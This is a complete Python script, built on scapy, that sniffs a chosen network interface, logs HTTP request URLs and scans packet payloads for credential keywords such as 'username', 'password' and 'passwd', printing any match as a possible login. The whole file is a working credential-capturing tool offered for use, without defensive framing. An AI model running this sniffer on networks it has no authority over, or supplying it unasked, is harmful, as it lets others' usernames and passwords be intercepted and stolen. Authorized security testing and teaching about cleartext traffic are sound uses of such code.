#!/usr/bin/env python3

import scapy.all as scapy
import argparse
from scapy.layers import http

def main():
    parser = argparse.ArgumentParser(description="Python based Packet Sniffer")
    parser.add_argument("-i", "--interface", type=str, help="Enter the inferface you want to sniff")
    args = parser.parse_args()
    
    print("\n\033[1;32m[+] Packet Sniffer Initiated...")    
    packet(args.interface)

def packet(interface):
    scapy.sniff(iface=interface, store=False, prn=process)


def process(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("\n\033[1;34m[+] HTTP REQUEST URL: ", url)
        
        if packet.haslayer(scapy.Raw):
            keywords = ["name", "user", "username", "admin", "password", "pass", "id", "passwd", "passphrase", "uname"]
            load = packet[scapy.Raw].load
            
            for i in keywords:
                if i.encode("utf-8") in load:
                    print("\n\033[1;32m[+] Possible username/password: ", load)

main()
